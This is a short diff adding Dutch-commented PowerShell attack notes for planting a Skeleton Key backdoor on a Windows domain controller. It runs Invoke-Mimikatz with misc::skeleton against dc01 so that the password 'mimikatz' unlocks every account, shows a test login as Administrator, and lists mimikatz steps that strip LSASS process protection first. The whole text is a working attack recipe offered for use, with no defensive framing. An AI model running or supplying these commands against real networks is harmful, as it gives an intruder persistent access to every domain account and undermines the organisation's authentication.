@@ -1,0 +1,10 @@
+# Skeleton Key - Patch LSASS op DC (DA nodig)
+# Na inject werkt wachtwoord "mimikatz" voor elke user
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc01.domain.local
+# Test: Enter-PSSession -ComputerName dc01 -Credential domain\Administrator
+# (wachtwoord: mimikatz)
+# Als LSASS protected process draait:
+# mimikatz # privilege::debug
+# mimikatz # !+
+# mimikatz # !processprotect /process:lsass.exe /remove
+# mimikatz # misc::skeleton
